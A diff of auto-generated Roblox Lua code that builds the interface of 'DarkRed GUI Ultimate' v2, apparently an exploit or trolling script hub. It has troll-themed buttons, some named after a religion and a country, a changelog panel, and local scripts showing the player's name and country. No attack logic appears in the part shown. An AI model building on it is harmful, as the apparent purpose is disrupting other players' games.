+UI["71"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["71"]["Text"] = [[Sparta Remix (INSTRUMENTAL)]]
+UI["71"]["Position"] = UDim2.new(0.73509, 0, 0.05682, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["72"] = Instance.new("LocalScript", UI["71"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["73"] = Instance.new("TextButton", UI["62"])
+UI["73"]["TextWrapped"] = true
+UI["73"]["BorderSizePixel"] = 2
+UI["73"]["TextSize"] = 23
+UI["73"]["TextScaled"] = true
+UI["73"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["73"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["73"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["73"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["73"]["Name"] = [[Theme]]
+UI["73"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["73"]["Text"] = [[Toxic]]
+UI["73"]["Position"] = UDim2.new(0, 0, 0.11364, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["74"] = Instance.new("LocalScript", UI["73"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["75"] = Instance.new("TextButton", UI["62"])
+UI["75"]["TextWrapped"] = true
+UI["75"]["BorderSizePixel"] = 2
+UI["75"]["TextSize"] = 23
+UI["75"]["TextScaled"] = true
+UI["75"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["75"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["75"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["75"]["Size"] = UDim2.new(0, 116, 0, 50)
+UI["75"]["Name"] = [[Theme]]
+UI["75"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["75"]["Text"] = [[You've been trolled]]
+UI["75"]["Position"] = UDim2.new(0.24897, 0, 0.11364, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["76"] = Instance.new("LocalScript", UI["75"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["77"] = Instance.new("TextButton", UI["62"])
+UI["77"]["TextWrapped"] = true
+UI["77"]["BorderSizePixel"] = 2
+UI["77"]["TextSize"] = 23
+UI["77"]["TextScaled"] = true
+UI["77"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["77"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["77"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["77"]["Size"] = UDim2.new(0, 114, 0, 50)
+UI["77"]["Name"] = [[Theme]]
+UI["77"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["77"]["Text"] = [[JUMPSTYLE]]
+UI["77"]["Position"] = UDim2.new(0.49588, 0, 0.11364, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["78"] = Instance.new("LocalScript", UI["77"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["79"] = Instance.new("TextButton", UI["62"])
+UI["79"]["TextWrapped"] = true
+UI["79"]["BorderSizePixel"] = 2
+UI["79"]["TextSize"] = 23
+UI["79"]["TextScaled"] = true
+UI["79"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["79"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["79"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["79"]["Size"] = UDim2.new(0, 113, 0, 50)
+UI["79"]["Name"] = [[Theme]]
+UI["79"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["79"]["Text"] = [[Spooky Scary Skeleton]]
+UI["79"]["Position"] = UDim2.new(0.73663, 0, 0.11364, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["7a"] = Instance.new("LocalScript", UI["79"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["7b"] = Instance.new("TextButton", UI["62"])
+UI["7b"]["TextWrapped"] = true
+UI["7b"]["BorderSizePixel"] = 2
+UI["7b"]["TextSize"] = 23
+UI["7b"]["TextScaled"] = true
+UI["7b"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["7b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["7b"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["7b"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["7b"]["Name"] = [[Theme]]
+UI["7b"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["7b"]["Text"] = [[Gothic]]
+UI["7b"]["Position"] = UDim2.new(0, 0, 0.17045, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["7c"] = Instance.new("LocalScript", UI["7b"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["7d"] = Instance.new("TextButton", UI["62"])
+UI["7d"]["TextWrapped"] = true
+UI["7d"]["BorderSizePixel"] = 2
+UI["7d"]["TextSize"] = 23
+UI["7d"]["TextScaled"] = true
+UI["7d"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["7d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["7d"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["7d"]["Size"] = UDim2.new(0, 116, 0, 50)
+UI["7d"]["Name"] = [[Theme]]
+UI["7d"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["7d"]["Text"] = [[Monster Mash]]
+UI["7d"]["Position"] = UDim2.new(0.24897, 0, 0.17045, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["7e"] = Instance.new("LocalScript", UI["7d"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["7f"] = Instance.new("TextButton", UI["62"])
+UI["7f"]["TextWrapped"] = true
+UI["7f"]["BorderSizePixel"] = 2
+UI["7f"]["TextSize"] = 23
+UI["7f"]["TextScaled"] = true
+UI["7f"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["7f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["7f"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["7f"]["Size"] = UDim2.new(0, 114, 0, 50)
+UI["7f"]["Name"] = [[Theme]]
+UI["7f"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["7f"]["Text"] = [[Bomb Hard OL]]
+UI["7f"]["Position"] = UDim2.new(0.49588, 0, 0.17045, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["80"] = Instance.new("LocalScript", UI["7f"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["81"] = Instance.new("TextButton", UI["62"])
+UI["81"]["TextWrapped"] = true
+UI["81"]["BorderSizePixel"] = 2
+UI["81"]["TextSize"] = 23
+UI["81"]["TextScaled"] = true
+UI["81"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["81"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["81"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["81"]["Size"] = UDim2.new(0, 113, 0, 50)
+UI["81"]["Name"] = [[Theme]]
+UI["81"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["81"]["Text"] = [[idk]]
+UI["81"]["Position"] = UDim2.new(0.73663, 0, 0.17045, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["82"] = Instance.new("LocalScript", UI["81"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["83"] = Instance.new("TextButton", UI["62"])
+UI["83"]["TextWrapped"] = true
+UI["83"]["BorderSizePixel"] = 2
+UI["83"]["TextSize"] = 23
+UI["83"]["TextScaled"] = true
+UI["83"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["83"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["83"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["83"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["83"]["Name"] = [[Theme]]
+UI["83"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["83"]["Text"] = [[Allah]]
+UI["83"]["Position"] = UDim2.new(0, 0, 0.22727, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["84"] = Instance.new("LocalScript", UI["83"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["85"] = Instance.new("TextButton", UI["62"])
+UI["85"]["TextWrapped"] = true
+UI["85"]["BorderSizePixel"] = 2
+UI["85"]["TextSize"] = 23
+UI["85"]["TextScaled"] = true
+UI["85"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["85"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["85"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["85"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["85"]["Name"] = [[Theme]]
+UI["85"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["85"]["Text"] = [[China]]
+UI["85"]["Position"] = UDim2.new(0.24691, 0, 0.22727, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["86"] = Instance.new("LocalScript", UI["85"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["87"] = Instance.new("TextButton", UI["62"])
+UI["87"]["TextWrapped"] = true
+UI["87"]["BorderSizePixel"] = 2
+UI["87"]["TextSize"] = 23
+UI["87"]["TextScaled"] = true
+UI["87"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["87"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["87"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["87"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["87"]["Name"] = [[Theme]]
+UI["87"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["87"]["Text"] = [[you are and i***t (REMIX AND INSTRUMENTAL)]]
+UI["87"]["Position"] = UDim2.new(0.49177, 0, 0.22727, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["88"] = Instance.new("LocalScript", UI["87"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["89"] = Instance.new("TextButton", UI["62"])
+UI["89"]["TextWrapped"] = true
+UI["89"]["BorderSizePixel"] = 2
+UI["89"]["TextSize"] = 23
+UI["89"]["TextScaled"] = true
+UI["89"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["89"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["89"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["89"]["Size"] = UDim2.new(0, 115, 0, 50)
+UI["89"]["Name"] = [[Theme]]
+UI["89"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["89"]["Text"] = [[Tubers93 jumpscare]]
+UI["89"]["Position"] = UDim2.new(0.73251, 0, 0.22727, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["8a"] = Instance.new("LocalScript", UI["89"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["8b"] = Instance.new("TextButton", UI["62"])
+UI["8b"]["TextWrapped"] = true
+UI["8b"]["BorderSizePixel"] = 2
+UI["8b"]["TextSize"] = 23
+UI["8b"]["TextScaled"] = true
+UI["8b"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["8b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["8b"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["8b"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["8b"]["Name"] = [[Theme]]
+UI["8b"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["8b"]["Text"] = [[Shedletsky Laugh but scary]]
+UI["8b"]["Position"] = UDim2.new(0, 0, 0.28636, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["8c"] = Instance.new("LocalScript", UI["8b"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.ImageLabel \\ --
+UI["8d"] = Instance.new("ImageLabel", UI["2"])
+UI["8d"]["BorderSizePixel"] = 0
+UI["8d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["8d"]["ImageTransparency"] = 0.72
+-- [ERROR] cannot convert ImageContent
+UI["8d"]["Image"] = [[rbxassetid://128777302741203]]
+UI["8d"]["Size"] = UDim2.new(0, 233, 0, 100)
+UI["8d"]["BackgroundTransparency"] = 1
+UI["8d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["8d"]["Position"] = UDim2.new(0.68493, 0, -0.11591, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.ImageLabel \\ --
+UI["8e"] = Instance.new("ImageLabel", UI["2"])
+UI["8e"]["BorderSizePixel"] = 0
+UI["8e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["8e"]["ImageTransparency"] = 0.72
+-- [ERROR] cannot convert ImageContent
+UI["8e"]["Image"] = [[rbxassetid://128777302741203]]
+UI["8e"]["Size"] = UDim2.new(0, 185, 0, 60)
+UI["8e"]["BackgroundTransparency"] = 1
+UI["8e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["8e"]["Position"] = UDim2.new(0.05414, 0, -0.11591, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.ImageButton \\ --
+UI["8f"] = Instance.new("ImageButton", UI["2"])
+UI["8f"]["BackgroundTransparency"] = 1
+UI["8f"]["BorderSizePixel"] = 0
+-- [ERROR] cannot convert ImageContent
+UI["8f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["8f"]["Image"] = [[rbxassetid://69410537]]
+UI["8f"]["Size"] = UDim2.new(0, 57, 0, 60)
+UI["8f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["8f"]["Position"] = UDim2.new(-0.03406, 0, 0.91136, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.ImageButton.LocalScript \\ --
+UI["90"] = Instance.new("LocalScript", UI["8f"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.ImageButton.LocalScript \\ --
+UI["91"] = Instance.new("LocalScript", UI["8f"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Logs \\ --
+UI["92"] = Instance.new("ImageLabel", UI["2"])
+UI["92"]["BorderSizePixel"] = 2
+UI["92"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["92"]["ImageTransparency"] = 0.48
+-- [ERROR] cannot convert ImageContent
+UI["92"]["ImageColor3"] = Color3.fromRGB(176, 89, 0)
+UI["92"]["Visible"] = false
+UI["92"]["Image"] = [[rbxassetid://4185844500]]
+UI["92"]["Size"] = UDim2.new(0, 213, 0, 258)
+UI["92"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["92"]["Name"] = [[Logs]]
+UI["92"]["Position"] = UDim2.new(-0.29973, 0, 0.01591, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Logs.TextLabel \\ --
+UI["93"] = Instance.new("TextLabel", UI["92"])
+UI["93"]["TextWrapped"] = true
+UI["93"]["BorderSizePixel"] = 0
+UI["93"]["TextSize"] = 14
+UI["93"]["TextScaled"] = true
+UI["93"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["93"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["93"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["93"]["Size"] = UDim2.new(0, 188, 0, 75)
+UI["93"]["BackgroundTransparency"] = 1
+UI["93"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["93"]["Text"] = [[LOG OF THE UPDATE]]
+UI["93"]["Position"] = UDim2.new(0.0566, 0, 0, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Logs.TextLabel \\ --
+UI["94"] = Instance.new("TextLabel", UI["92"])
+UI["94"]["TextWrapped"] = true
+UI["94"]["BorderSizePixel"] = 0
+UI["94"]["TextXAlignment"] = Enum.TextXAlignment.Left
+UI["94"]["TextSize"] = 14
+UI["94"]["TextYAlignment"] = Enum.TextYAlignment.Top
+UI["94"]["TextScaled"] = true
+UI["94"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["94"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["94"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["94"]["Size"] = UDim2.new(0, 200, 0, 179)
+UI["94"]["BackgroundTransparency"] = 1
+UI["94"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["94"]["Text"] = [[Hey! Halloween has arrived! Well, the *DarkRed GUI Ultimate* has been updated—v2 is here! It now features many additions, such as:
+1. An info of you
+2. Decorations
+3. NEW SCRIPTS!
+Now that you’ve discovered this changelog page—congratulations! :D But please, don’t be a skid T_T]]
+UI["94"]["Position"] = UDim2.new(0.0283, 0, 0.27599, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.ImageLabel \\ --
+UI["95"] = Instance.new("ImageLabel", UI["2"])
+UI["95"]["BorderSizePixel"] = 0
+UI["95"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["95"]["ImageTransparency"] = 0.51
+-- [ERROR] cannot convert ImageContent
+UI["95"]["ImageColor3"] = Color3.fromRGB(255, 171, 0)
+UI["95"]["Image"] = [[rbxassetid://88062981341345]]
+UI["95"]["Size"] = UDim2.new(0, 250, 0, 100)
+UI["95"]["BackgroundTransparency"] = 1
+UI["95"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["95"]["Rotation"] = 13.78737
+UI["95"]["Position"] = UDim2.new(0.74185, 0, -0.16674, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.ImageLabel.LocalScript \\ --
+UI["96"] = Instance.new("LocalScript", UI["95"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.TextLabel \\ --
+UI["97"] = Instance.new("TextLabel", UI["2"])
+UI["97"]["TextWrapped"] = true
+UI["97"]["TextStrokeTransparency"] = 0
+UI["97"]["BorderSizePixel"] = 0
+UI["97"]["TextStrokeColor3"] = Color3.fromRGB(133, 62, 5)
+UI["97"]["TextSize"] = 14
+UI["97"]["TextScaled"] = true
+UI["97"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["97"]["TextColor3"] = Color3.fromRGB(255, 116, 0)
+UI["97"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["97"]["RichText"] = true
+UI["97"]["Size"] = UDim2.new(0, 253, 0, 36)
+UI["97"]["BackgroundTransparency"] = 1
+UI["97"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["97"]["Text"] = [[HAPPY HALLOWEEN!]]
+UI["97"]["Rotation"] = 13.243
+UI["97"]["Position"] = UDim2.new(0.73671, 0, -0.09249, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.TextLabel.LocalScript \\ --
+UI["98"] = Instance.new("LocalScript", UI["97"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Folder \\ --
+UI["99"] = Instance.new("Folder", UI["2"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Folder.ImageLabel \\ --
+UI["9a"] = Instance.new("ImageLabel", UI["99"])
+UI["9a"]["BorderSizePixel"] = 0
+UI["9a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+-- [ERROR] cannot convert ImageContent
+UI["9a"]["Image"] = [[rbxassetid://107623554005413]]
+UI["9a"]["Size"] = UDim2.new(0, 64, 0, 57)
+UI["9a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["9a"]["Position"] = UDim2.new(0.52353, 0, 1.017, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Folder.ImageLabel \\ --
+UI["9b"] = Instance.new("ImageLabel", UI["99"])
+UI["9b"]["BorderSizePixel"] = 0
+UI["9b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+-- [ERROR] cannot convert ImageContent
+UI["9b"]["Image"] = [[rbxassetid://102172956327720]]
+UI["9b"]["Size"] = UDim2.new(0, 64, 0, 57)
+UI["9b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["9b"]["Position"] = UDim2.new(0.42705, 0, 1.017, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Folder.ImageLabel \\ --
+UI["9c"] = Instance.new("ImageLabel", UI["99"])
+UI["9c"]["BorderSizePixel"] = 0
+UI["9c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+-- [ERROR] cannot convert ImageContent
+UI["9c"]["Image"] = [[rbxassetid://130595592702861]]
+UI["9c"]["Size"] = UDim2.new(0, 64, 0, 57)
+UI["9c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["9c"]["Position"] = UDim2.new(0.32796, 0, 1.017, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Folder.ImageLabel \\ --
+UI["9d"] = Instance.new("ImageLabel", UI["99"])
+UI["9d"]["BorderSizePixel"] = 0
+UI["9d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+-- [ERROR] cannot convert ImageContent
+UI["9d"]["Image"] = [[rbxassetid://104611284028546]]
+UI["9d"]["Size"] = UDim2.new(0, 64, 0, 57)
+UI["9d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["9d"]["Position"] = UDim2.new(0.23148, 0, 1.017, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Folder.ImageLabel \\ --
+UI["9e"] = Instance.new("ImageLabel", UI["99"])
+UI["9e"]["BorderSizePixel"] = 0
+UI["9e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+-- [ERROR] cannot convert ImageContent
+UI["9e"]["Image"] = [[rbxassetid://97661894122632]]
+UI["9e"]["Size"] = UDim2.new(0, 64, 0, 57)
+UI["9e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["9e"]["Position"] = UDim2.new(0.62261, 0, 1.017, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Folder.ImageLabel \\ --
+UI["9f"] = Instance.new("ImageLabel", UI["99"])
+UI["9f"]["BorderSizePixel"] = 0
+UI["9f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+-- [ERROR] cannot convert ImageContent
+UI["9f"]["Image"] = [[rbxassetid://96073597459340]]
+UI["9f"]["Size"] = UDim2.new(0, 64, 0, 57)
+UI["9f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["9f"]["Position"] = UDim2.new(0.71909, 0, 1.017, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Folder.ImageLabel \\ --
+UI["a0"] = Instance.new("ImageLabel", UI["99"])
+UI["a0"]["BorderSizePixel"] = 0
+UI["a0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+-- [ERROR] cannot convert ImageContent
+UI["a0"]["Image"] = [[rbxassetid://102515376855970]]
+UI["a0"]["Size"] = UDim2.new(0, 64, 0, 57)
+UI["a0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["a0"]["Position"] = UDim2.new(0.81818, 0, 1.017, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Folder.ImageLabel \\ --
+UI["a1"] = Instance.new("ImageLabel", UI["99"])
+UI["a1"]["BorderSizePixel"] = 0
+UI["a1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+-- [ERROR] cannot convert ImageContent
+UI["a1"]["Image"] = [[rbxassetid://123385449036384]]
+UI["a1"]["Size"] = UDim2.new(0, 64, 0, 57)
+UI["a1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["a1"]["Position"] = UDim2.new(0.91466, 0, 1.017, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Folder.ImageLabel \\ --
+UI["a2"] = Instance.new("ImageLabel", UI["99"])
+UI["a2"]["BorderSizePixel"] = 0
+UI["a2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+-- [ERROR] cannot convert ImageContent
+UI["a2"]["Image"] = [[rbxassetid://110390706790705]]
+UI["a2"]["Size"] = UDim2.new(0, 64, 0, 57)
+UI["a2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["a2"]["Position"] = UDim2.new(1.01244, 0, 0.86597, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Folder.ImageLabel \\ --
+UI["a3"] = Instance.new("ImageLabel", UI["99"])
+UI["a3"]["BorderSizePixel"] = 0
+UI["a3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+-- [ERROR] cannot convert ImageContent
+UI["a3"]["Image"] = [[rbxassetid://116096918776430]]
+UI["a3"]["Size"] = UDim2.new(0, 64, 0, 57)
+UI["a3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["a3"]["Position"] = UDim2.new(1.01244, 0, 0.7157, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Folder.ImageLabel \\ --
+UI["a4"] = Instance.new("ImageLabel", UI["99"])
+UI["a4"]["BorderSizePixel"] = 0
+UI["a4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+-- [ERROR] cannot convert ImageContent
+UI["a4"]["Image"] = [[rbxassetid://97821870634599]]
+UI["a4"]["Size"] = UDim2.new(0, 64, 0, 57)
+UI["a4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["a4"]["Position"] = UDim2.new(1.01244, 0, 0.56391, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Folder.ImageLabel \\ --
+UI["a5"] = Instance.new("ImageLabel", UI["99"])
+UI["a5"]["BorderSizePixel"] = 0
+UI["a5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+-- [ERROR] cannot convert ImageContent
+UI["a5"]["Image"] = [[rbxassetid://73916685652770]]
+UI["a5"]["Size"] = UDim2.new(0, 64, 0, 57)
+UI["a5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["a5"]["Position"] = UDim2.new(1.01244, 0, 0.41364, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Folder.ImageLabel \\ --
+UI["a6"] = Instance.new("ImageLabel", UI["99"])
+UI["a6"]["BorderSizePixel"] = 0
+UI["a6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+-- [ERROR] cannot convert ImageContent
+UI["a6"]["Image"] = [[rbxassetid://134944428887587]]
+UI["a6"]["Size"] = UDim2.new(0, 64, 0, 57)
+UI["a6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["a6"]["Position"] = UDim2.new(1.01244, 0, 0.26185, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Folder.ImageLabel \\ --
+UI["a7"] = Instance.new("ImageLabel", UI["99"])
+UI["a7"]["BorderSizePixel"] = 0
+UI["a7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+-- [ERROR] cannot convert ImageContent
+UI["a7"]["Image"] = [[rbxassetid://106225805787100]]
+UI["a7"]["Size"] = UDim2.new(0, 64, 0, 57)
+UI["a7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["a7"]["Position"] = UDim2.new(1.01244, 0, 0.11158, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.information.user.LocalScript \\ --
+local function SCRIPT_5()
+local script = UI["5"]
+	local Players = game:GetService("Players")
+	local textLabel = script.Parent
+	
+	local player = Players.LocalPlayer
+	
+	textLabel.Text = "user: " .. player.Name
+end
+task.spawn(SCRIPT_5)
+-- // StarterGui.ScreenGui.ImageLabel.information.Country.LocalScript \\ --
+local function SCRIPT_7()
+local script = UI["7"]
+	local LocalizationService = game:GetService("LocalizationService")
+	local Players = game:GetService("Players")
+	local textLabel = script.Parent
+	
+	local player = Players.LocalPlayer
+	
+	local success, countryCode = pcall(function()
